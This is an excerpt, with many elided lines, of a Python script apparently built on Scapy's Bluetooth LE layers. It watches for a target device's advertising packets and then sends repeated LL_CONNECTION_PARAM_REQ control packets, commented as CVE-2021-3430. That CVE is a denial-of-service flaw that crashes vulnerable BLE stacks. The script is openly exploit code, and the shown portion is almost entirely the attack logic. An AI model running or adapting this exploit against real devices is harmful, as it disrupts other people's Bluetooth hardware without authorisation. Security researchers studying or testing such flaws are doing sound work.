...
while(attack):
    ...
    if data:
        ...
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and hasattr(pkt, 'AdvA') and pkt.AdvA == advertiser_address.lower() and \
            ...
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_CONNECTION_PARAM_REQ()
            driver.send(pkt) #CVE-2021-3430
            driver.send(pkt)
            print(Fore.RED + 'Multiple LL_CONNECTION_PARAM_REQ packets sent')
